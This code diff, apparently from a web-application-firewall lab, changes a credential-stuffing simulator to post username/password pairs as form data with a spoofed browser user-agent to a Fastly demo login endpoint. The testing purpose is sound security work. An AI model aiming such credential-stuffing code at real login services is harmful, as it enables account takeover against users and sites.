@@ -33,17 +33,24 @@ async function doCredentialStuffing(){
       const number = getRandomInt(10) === 0 ? 200 : 401;
   
       // Construct the JSON body
-      const jsonBody = JSON.stringify({
-        username: usernames_password.name,
-        password: usernames_password.password,
-      });
+      // const jsonBody = JSON.stringify({
+      //   username: usernames_password.name,
+      //   password: usernames_password.password,
+      // });
   
       // Send the HTTP POST request
       // const url = 'https://http-me.edgecompute.app/anything/login';
       // const url = 'https://bcunning-ngwaf-lab.global.ssl.fastly.net/anything/login';
+
+      // Create the form data
+      const formData = new URLSearchParams();
+      formData.append('username',  usernames_password.name);
+      formData.append('password', usernames_password.password);
+
       const url = 'https://dev-tf-demo.global.ssl.fastly.net/anything/login';
       const reqHeaders = {
-        'Content-Type': 'application/json',
+        // 'Content-Type': 'application/json',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
         'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         'Accept': '*/*',
         'endpoint': `status=${number}`
@@ -53,7 +60,8 @@ async function doCredentialStuffing(){
       const response = fetch(url, {
         method: 'POST',
         headers: reqHeaders,
-        body: jsonBody,
+        // body: jsonBody,
+        body: formData,
         backend: 'credstuffingtarget',
       });
   
